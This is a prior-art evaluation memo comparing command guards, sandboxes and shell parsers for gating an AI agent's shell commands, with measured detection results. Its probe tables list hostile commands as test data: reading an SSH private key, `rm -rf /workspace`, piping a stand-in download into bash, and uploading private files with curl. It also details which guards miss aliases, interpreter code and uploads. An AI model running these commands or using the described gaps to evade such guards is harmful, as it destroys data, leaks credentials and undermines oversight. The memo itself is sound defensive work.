# Maintainer command guards and sandboxes

Inspected 2026-11-05 for MAINTAINER-PRIOR-ART-01.

Keep Grapt's existing permission and sandbox owners. None of the measured
command guards supplies the required floor for interpreter code, known private
stores and deletion of the whole workspace. Reuse selected parser and policy
ideas, preserve kernel containment, and send unresolved effects to the judge.
A judge approval must not override the floor or make an unavailable sandbox run
uncontained. This is a reuse recommendation; no dependency or live hook was added.

## What was measured

The study used **42 synthetic labeled fixtures**: 12 floor cases, 12
non-destructive controls and 18 cases requiring context or effect review. The
floor assumes `/workspace` and a known private store at `/private-profile`.
The 18 context cases have no binary safe/danger label and are reported separately.

It also used **38 synthetic representatives** made from step-0 aggregate
shape labels. The original commands were intentionally not retained in a
normalized replay corpus. These representatives establish neither real-command
coverage nor a real-workload false-positive rate. Their overlapping shape weights
were not summed or used to estimate coverage. There was no replay of raw seat
rollouts, private arguments, profiles or credentials.

The baseline was the original `command_safety::classify` API at
`bf467f59542eeee6a794185af71a91cc31790d21`, rather than its
experimental positive-shape adapter. The baseline source also matches the classifier and its helper modules
at the inspected canonical base `9f8f130cc`. `None` means this classifier found
no listed danger; it is **not a positive safety or authority decision**.

Every candidate execution used a separate process inside bubblewrap with
`--unshare-all --cap-drop ALL --clearenv --die-with-parent --new-session`.
Only public runtime files, the selected code, synthetic inputs and scratch were
available; the home was empty, the network namespace isolated and the source
read-only. Candidate commands were passed as strings to classification APIs,
never evaluated by a shell or interpreter. npm archives were downloaded and their
registry integrity checked without running install scripts. Source builds were
not needed for the final candidate measurements.

| Measured interface | Floor cases flagged / 12 | Controls flagged / 12 | Context cases flagged / 18 |
| --- | ---: | ---: | ---: |
| Grapt `classify`: any `Some(Danger)` | 4 | 0 | 2 |
| pi-safe-shell 0.7.1 AST score ≥ 81, its default critical threshold | 1 | 0 | 0 |
| pi-safe-shell AST score ≥ 51, also counting its danger band | 3 | 0 | 1 |
| pi-ast-guard 1.4.6 default policy: `ask` or `block` | 4 | 0 | 3 |
| AgentShield 1.0.2 `guard --stdin`: `block` | 0 | 0 | 0 |

A flag in this table is a detector result, not proof that a host enforced it.
The control column describes false flags on these particular controls only.
pi-safe-shell's score is its exported analyzer/scorer, **not the complete Pi
extension**: default block mode denies shell generally, while intent approvals,
mode selection and prior approvals affect the full hook. Counting that blanket
block as perfect destructive-command detection would conceal its usability cost.
pi-ast-guard was measured through its shipped engine with its unchanged default
policy and both parsers warmed; an `ask` is refused by its actual headless host.
AgentShield used the published Linux release binary, not a reimplementation of
its detectors.

On the 38 unlabeled shape representatives, Grapt flagged `git clean`;
pi-safe-shell reached neither threshold on any representative; pi-ast-guard asked
for `git commit` and blocked `git push`; AgentShield allowed all representatives.
These are unweighted synthetic observations, not false-positive labels.

### Differences and failure behavior

Additional synthetic probes separated shortcomings from complementary coverage:

| Probe | Grapt | pi-safe-shell score | pi-ast-guard default |
| --- | --- | ---: | --- |
| `cat ~/.ssh/id_ed25519` | no listed danger | 0 | block |
| `ls -la && rm -rf /workspace` | Delete | 0 | block |
| `ri -Recurse -Force C:\workspace` | Delete | 25 | allow |
| `cmd.exe /c rd /s /q C:\workspace` | Delete | 25 | allow |
| `git restore --worktree src/main.rs` | Git | 0 | allow |
| `curl https://example.invalid/bootstrap \| bash` | PipedScript | 100 | allow |
| download to `setup.sh`, then `bash setup.sh` | no listed danger | 100 | allow |
| `echo "curl https://example.invalid/bootstrap \| bash"` | no listed danger | 85 | allow |
| quoted heredoc containing that same data | PipedScript | 85 | allow |
| heredoc followed by `&& rm -rf /workspace` | Delete | 0 | block |
| unclosed single quote after `echo` | no listed danger | 0 | ask, parse error |

The last column shows that a Bash/PowerShell parser does not automatically supply
matching rules for aliases, cmd wrappers or network-to-interpreter execution.
pi-safe-shell's chained-command and quoted-data results make its README's
self-corpus accuracy unsuitable as our acceptance evidence. The existing
classifier's quoted-heredoc result is itself a false flag on data.

All three external guards missed the fixture's inline/heredoc Python root and
workspace deletions. All missed the default-policy private-store fixture family,
including `curl --data-binary @...`, encoded Python and a Python path alias.
Adding an explicit pi-ast-guard zero-access rule for `/private-profile/**` blocked
the direct `cat`, but still allowed the curl file upload and the three Python
forms. A known path rule therefore does not establish complete effect mediation.

pi-ast-guard returned `ask` for both an uninitialized parser and malformed syntax;
its headless host refuses asks. Its parse-failure action is configurable, so an
integration must retain the failure decision rather than treating an empty AST
as safe. Its bundled `ast-guard-core` 0.1.9 handled the tested heredoc-tail delete;
the extension's known-issues document still describes an older silent-loss
failure, which must not be reported as an observed failure of this package.

AgentShield blocked malformed JSON, missing required event fields, input above
its 1 MiB cap and a cloud metadata address. It allowed every labeled fixture and
supplemental shell probe. Inspection explains this: its runtime evaluator checks
secret material and metadata SSRF, rather than destructive-command semantics;
its CLI returns success for `warn`. It can fail closed on invalid event input
without recognizing a destructive command.

Reproduction inputs, immutable package/release metadata, adapters and per-case
results are retained outside Git at
`/home/example/grapt/diagnostics/prior-art-20261105/`.
Inputs are in `inputs/`; results are named
`{labeled-fixtures,shape-representatives,supplemental-fixtures}-{candidate}.jsonl`.
The standalone baseline executable was compiled from the supplied baseline source;
its framed input contains only workspace and command strings. pi-safe-shell uses
`initParser`, `analyzeCommand` and `scoreCommandV2`. pi-ast-guard uses
`createDamageControlEngine(...).checkBash` with shipped `defaultPolicy`.
AgentShield receives one documented runtime event through `guard --stdin` per
process. There were no live agent installations or paid/model calls.

## Candidate decisions

Pins below identify what was inspected, not a floating dependency recommendation.
Maintenance dates are the inspected HEAD commit dates, not assurances of support;
creation dates come from repository metadata. Platform execution was Linux only.
Sandboxes were source-inspected, not exercised or escape-tested in this study.

### Command guards

| Candidate and pin | Exact license and maintenance | Form / Windows | Failure behavior, actual scope and verdict |
| --- | --- | --- | --- |
| [destructive_command_guard](https://github.com/Dicklesworthstone/destructive_command_guard/tree/ead7360499bd43f86d889d95476a16144081acdc) | [MIT **with OpenAI/Anthropic Rider**](https://github.com/Dicklesworthstone/destructive_command_guard/blob/ead7360499bd43f86d889d95476a16144081acdc/LICENSE), not unmodified MIT. Created 2026-01-07; HEAD 2026-11-05. | Rust hook/CLI according to project metadata; Windows behavior unverified. | **SKIP.** The rider expressly restricts use, analysis and benchmarking for named parties. It fails the requested no-riders license criterion. Implementation was not inspected or executed after that check. The suggested fail-open behavior, pack count and heredoc coverage remain unverified claims. |
| [sh-guard](https://github.com/aryanbhosale/sh-guard/tree/92005d65b1232946924b524bcad267a29d8a2cb5) | [GPL-3.0-only](https://github.com/aryanbhosale/sh-guard/blob/92005d65b1232946924b524bcad267a29d8a2cb5/LICENSE), outside MIT/Apache reuse scope. Created 2026-04-04; HEAD 2026-04-06. | Rust core library, CLI/MCP and bindings advertised; Windows binaries advertised. Bash grammar does not imply PowerShell support. | **SKIP.** README describes syntax, intent/scope and pipeline analysis, but the implementation and fail-open/closed behavior were not examined or run because of the license constraint. No code or rule text is proposed for copying. |
| [pi-safe-shell](https://github.com/aslamplr/pi-safe-shell/tree/75dc9d6560d3e55567ec6519707ba89c0871e736), 0.7.1 | `package.json` declares **MIT**, but this repository has no LICENSE file; complete distribution notice needs resolution before copying. Created 2026-05-13; HEAD 2026-06-11. | TypeScript Pi extension; web-tree-sitter/WASM analyzer, not a Rust crate. Bash analysis; no native PowerShell/cmd backend found. | **LEARN.** Measured AST scoring has direct-delete misses and quoted-data false flags. Full hook catches analysis errors and continues into mode policy; intent auto-approval and temporary approvals precede AST checking. Default block mode is conservative, while failure behavior depends on the selected mode. Do not adopt its safe-command shortcuts or use a score as permission authority. |
| [pi-ast-guard](https://www.npmjs.com/package/pi-ast-guard/v/1.4.6), 1.4.6; [`ast-guard-core`](https://www.npmjs.com/package/ast-guard-core/v/0.1.9), 0.1.9 | Both published archives contain unmodified **MIT** license text. Package repository is [Gitee](https://gitee.com/dsxbygzzl/pi-ast-guard), not the guessed GitHub location; no git commit is supplied in npm metadata. npm first published 2026-08-02; inspected release 2026-10-19. | TypeScript extension plus reusable JS engine and Bash/PowerShell WASM grammars. Explicit PowerShell tool integration is present; Windows execution unmeasured. | **ADAPT**, narrowly. Reuse parser-error handling, separate command/file intents, static-variable handling and quoted-data distinctions in the existing Rust owner, preserving notices for any copied code. Do not import a second TS policy owner. Default parse errors ask and headless asks refuse, but file effects inside Python/Node, curl upload operands and tested aliases escape its default rules. Readiness and a complete AST are prerequisites, not proof of safe effects. |
| [AgentShield / `agent-shield`](https://github.com/aiconnai/agentshield/tree/db92d4ec249d342e7d776ad1d90e58abc3b95930) | [MIT OR Apache-2.0](https://github.com/aiconnai/agentshield/blob/db92d4ec249d342e7d776ad1d90e58abc3b95930/LICENSE), both complete texts, no rider found. Created 2026-02-14; inspected main HEAD 2026-10-29. Measured [v1.0.2](https://github.com/aiconnai/agentshield/tree/7aa2839be842e11417da9679e4a04055d9e452ce), released 2026-10-14. | Rust library/CLI, static tool-source scanner and experimental runtime guard/proxies; Windows release asset exists, not executed. | **LEARN.** Source/sink analysis and redaction ideas may help tool audits. The actual stdin runtime guard is not a destructive shell classifier: invalid events block, metadata SSRF blocks, secret findings warn, and ordinary command text can allow. Relevant guard, CLI input, event and detector source files match between the inspected main and measured release. Do not use it as the floor. |
| [bytepiper/agent-shield](https://github.com/bytepiper/agent-shield/tree/4149e6b2551e1751c2ff0c4b95f601ae7e945443), name disambiguation | No license file or repository license grant found. Created 2026-04-01; HEAD 2026-04-28, initial commit. | Metadata says Rust; no library/Windows/runtime claim validated. | **SKIP.** This is another match for the ambiguous name. No implementation inspection or execution, and no borrowing without a usable license. It must not be silently conflated with the MIT/Apache crates.io project above. |

### Sandboxes

| Candidate and pin | Exact license and maintenance | Form / Windows | Inspected behavior and verdict |
| --- | --- | --- | --- |
| [multikernel/sandlock](https://github.com/multikernel/sandlock/tree/2eca1110f2c8ba286996bdbf9a38698507a28794), workspace 0.9.1 | [Apache-2.0](https://github.com/multikernel/sandlock/blob/2eca1110f2c8ba286996bdbf9a38698507a28794/LICENSE), no rider found. Created 2026-03-13; HEAD 2026-11-05 UTC. | Rust core/CLI, OCI shim and C-ABI SDKs. Linux only; default documented floor Landlock ABI v6 / Linux 6.12. | **LEARN.** `landlock_policy.rs` rejects unavailable strict protections and a final status other than `FullyEnforced`; opt-in degraded/disabled protections change that contract. Useful model for explicit active-protection reporting. Seccomp notification, COW, policy callbacks and supervision are a large second effect owner; raw syscall/unsafe code is not suitable to copy into Grapt. Kernel escape resistance, COW correctness and advertised speed were not measured. |
| [akitaonrails/ai-jail](https://github.com/akitaonrails/ai-jail/tree/d0506a32fbae59906849bf68e9f3c833b2c82c23) | [GPL-3.0](https://github.com/akitaonrails/ai-jail/blob/d0506a32fbae59906849bf68e9f3c833b2c82c23/LICENSE), outside reuse scope. Created 2026-03-01; HEAD 2026-11-03. | Rust launcher; README advertises Linux and macOS, explicitly no native Windows. | **SKIP.** README explicitly scopes it to mistakes by trusted agents and makes invoked-agent credentials available by default. This does not satisfy a private-store floor. Source failure handling was not inspected or run after license rejection; its configuration fail-closed statements remain documentation claims. |
| [EeroEternal/agentcell](https://github.com/EeroEternal/agentcell/tree/17168dac83b324b225cf9004a444ed1c883b455b), 0.2.5 | [MIT](https://github.com/EeroEternal/agentcell/blob/17168dac83b324b225cf9004a444ed1c883b455b/LICENSE), no rider found. Created 2026-08-29; HEAD 2026-09-30. | C launcher/library and Rust FFI crate; Linux only. No native Windows backend. | **SKIP.** Namespace and seccomp code exists, but `landlock_apply` warns/returns on unavailable rulesets and warns on restriction failure; cgroup creation can continue without limits. These are degraded individual layers, not proof that every other isolation layer disappeared. The Rust FFI documents non-thread-safe spawn/release. A C ABI and a second process owner buy little over our existing path and do not meet a strict mandatory-layer contract unchanged. |
| [sandboxec/sandboxec](https://github.com/sandboxec/sandboxec/tree/2800a1dd0f00c97961ae96ca96430ba9c9b2e1ed), formerly `dwisiswant0/sandboxec`, v0.3.0 | [Apache-2.0 notice](https://github.com/sandboxec/sandboxec/blob/2800a1dd0f00c97961ae96ca96430ba9c9b2e1ed/LICENSE), incorporating the standard license by reference; no rider found. Its pinned Go enforcement module has the same license. Created 2026-02-14; HEAD 2026-03-03. | Go CLI/MCP wrapping `go.dw1.io/x/exp/sandboxec` at `d18485fc1746`; Linux only. | **LEARN.** The wrapper enables best effort only on request; the pinned enforcement source rejects unsupported ABI/Landlock by default and returns restriction errors before launching. An explicit best-effort option weakens that guarantee. Landlock filesystem/TCP rules do not cover arbitrary network protocols, resource exhaustion or full host isolation. Do not add a Go subprocess or new MCP execution path to replace existing ownership. |
| [openai/codex](https://github.com/openai/codex/tree/bb64b894fd67158be0f874872e6d7bfe717e7368): `codex-rs/linux-sandbox` and `codex-rs/execpolicy` | [Apache-2.0](https://github.com/openai/codex/blob/bb64b894fd67158be0f874872e6d7bfe717e7368/LICENSE), no rider found. Project created 2025-04-13; inspected approved pin 2026-10-15, not a claim about today's HEAD. | Rust libraries/helpers. `linux-sandbox` is Linux/WSL2, not native Windows; separate Codex Windows code is outside this inspected pair. Execpolicy is platform-independent argv policy. | **ADAPT.** Already our upstream for `command_safety` and the Linux bwrap/seccomp adapter. Retain this owner and improve gaps there. Restricted filesystem setup refuses unsupported legacy Landlock; bwrap failure does not silently choose an uncontained host run. Execpolicy applies the strictest matching decision and can constrain executable paths, but unmatched input has no decision: it is not a semantic shell allow. Prefix matching cannot inspect arbitrary interpreter effects. |
| [anthropics/sandbox-runtime](https://github.com/anthropics/sandbox-runtime/tree/98a4016d27609ed34dd1fb43d23ed6efb6eeeb77), former `anthropic-experimental` URL, 0.0.81 | [Apache-2.0](https://github.com/anthropics/sandbox-runtime/blob/98a4016d27609ed34dd1fb43d23ed6efb6eeeb77/LICENSE), no rider found. Created 2025-10-20; inspected HEAD 2026-10-25. | TypeScript SDK/CLI with native helpers. Linux bwrap/seccomp, macOS Seatbelt and an actual Windows helper/backend are present. No native platform run in this study. | **LEARN.** Source includes dependency/profile failures, protected configuration/git paths, proxy mediation and Windows WFP verification errors; it is more than a README sketch. Its Windows backend provisions a dedicated account and machine-wide WFP/ACL state, a distinct operational boundary. Explicit escape hatches and optional proxy/MITM modes need separate policy review. Do not replace Grapt's effect owner or infer complete default fail-closed behavior from one checked layer. |

### Parsers

| Candidate and pin | Exact license and maintenance | Form / Windows | Verdict and limits |
| --- | --- | --- | --- |
| [tree-sitter-bash](https://github.com/tree-sitter/tree-sitter-bash/tree/a06c2e4415e9bc0346c6b86d401879ffb44058f7), crate **=0.25.1** | [MIT](https://github.com/tree-sitter/tree-sitter-bash/blob/a06c2e4415e9bc0346c6b86d401879ffb44058f7/LICENSE), no rider found. Created 2017-07-14; inspected branch HEAD 2025-12-02. Exact crate exists and is not yanked. | Generated C grammar, Rust binding crate and WASM distribution. Can parse Bash on Windows; that does not make it a PowerShell/cmd parser. | **ADOPT**, as the pinned grammar crate if the implementation chooses AST parsing, keeping FFI inside the reviewed dependency. Never copy raw FFI into our crates. Reject parse errors and unsupported/dynamic constructs; specifically retain heredoc boundary tests. This study exercised the guards' bundled WASM, not this crate as an integrated Grapt dependency. |
| [tree-sitter-powershell](https://github.com/airbus-cert/tree-sitter-powershell/tree/65ea6919e816a7ac142acec7ee72757f89db8439), crate **=0.26.6** | [MIT](https://github.com/airbus-cert/tree-sitter-powershell/blob/65ea6919e816a7ac142acec7ee72757f89db8439/LICENSE), no rider found. Created 2023-09-11; HEAD 2026-10-28. Exact crate exists and is not yanked. | Generated C grammar and Rust binding crate; PowerShell syntax can be parsed on Linux or Windows. No Windows execution was tested. | **ADOPT**, conditionally through the pinned crate and a deliberately selected compatible tree-sitter engine. The inspected crate's dev engine is 0.26.5, while Bash's is 0.25; engine compatibility remains an integration check, not a verified workspace dependency choice. ASTs do not resolve PowerShell aliases, .NET/COM effects, dynamic invocation or filesystem identity. |

## Integration recommendation for MAINTAINER-AUTO-01

1. Keep the mandatory floor separate from permissive configuration, prior approvals
   and the judge. Known private-store targets require mediated paths, not only
   keyword matches. Protect the workspace root and host configuration from every
   execution surface, including scripts, nested calls and redirected writes.
2. Adapt upstream Codex mechanisms inside the current Rust permission/sandbox
   path. A pinned tree-sitter grammar can improve syntax fidelity; complete
   parsing, resolved executable/target identity and understood effects are still
   separate requirements. Parser errors, unavailable backends and exhausted
   bounds must remain unresolved/refused, never produce a deterministic allow.
3. Keep kernel containment and credential exclusion even when static rules find
   nothing. A writable workspace sandbox alone still permits deletion of its
   contents; recovery/checkpoint policy must be real before granting such effects.
   Confinement must cover descendants and alternate interpreters, not just the
   visible shell command spelling.
4. Use the judge for the remaining contextual effects after deterministic checks,
   rather than claiming all Python, package-manager or read-named commands safe.
   Bind its decision to the concrete prepared operation and existing authority.
   The study did not measure judge quality, cost, fleet coverage or a tiny gray zone.

The useful reuse is concentrated in Codex's established containment/policy path,
MIT grammar crates and selected pi-ast-guard parsing/intents. Copying an entire
hook, sandbox supervisor or score engine would add ownership and failure modes
without closing the measured floor gaps.
